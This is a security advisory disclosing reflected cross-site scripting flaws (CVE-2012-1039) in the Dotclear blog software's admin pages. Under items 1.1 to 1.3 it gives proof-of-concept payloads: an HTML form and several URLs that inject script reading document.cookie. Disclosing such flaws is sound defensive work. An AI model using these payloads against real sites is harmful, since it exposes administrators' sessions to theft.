Advisory Details:

High-Tech Bridge SA Security Research Lab has discovered multiple vulnerabilities in Dotclear, which can be exploited to perform Cross-Site Scripting (XSS) attacks.

1) Cross-Site Scripting (XSS) in Dotclear: CVE-2012-1039

1.1 Input passed via the "login_data" POST parameter to /admin/auth.php is not properly sanitised before being returned to the user.
This can be exploited to execute arbitrary HTML and script code in a user's browser session in context of affected website.

The following PoC (Proof of Concept) demonstrates the vulnerability:


<form action="http://[host]/admin/auth.php" method="post">
<input type="hidden" name="new_pwd" value="1" />
<input type="hidden" name="new_pwd_c" value="2" />
<input type="hidden" name="login_data" value='"><script>alert(document.cookie);</script>' />
<input type="submit" id="btn"> 
</form>


1.2 Input passed via the "nb" GET parameter to /admin/blogs.php is not properly sanitised before being returned to the user.
This can be exploited to execute arbitrary HTML and script code in administrator's browser session in context of affected website.

The following PoC (Proof of Concept) demonstrates the vulnerability:

http://[host]/admin/blogs.php?nb=5%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E

1.3 Input passed via the "type", "sortby", "order", "status" GET parameters to /admin/comments.php is not properly sanitised before being returned to the user.
This can be exploited to execute arbitrary HTML and script code in administrator's browser session in context of affected website.

The following PoC (Proof of Concept) demonstrates the vulnerability:

http://[host]/admin/comments.php?type=%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
http://[host]/admin/comments.php?sortby=%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E

http://[host]/admin/comments.php?status=%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E

1.4 Input passed via the "page" GET parameter to /admin/plugin.php is not properly sanitised before being returned to the user.
This can be exploited to execute arbitrary HTML and script code in administrator's browser session in context of affected website.
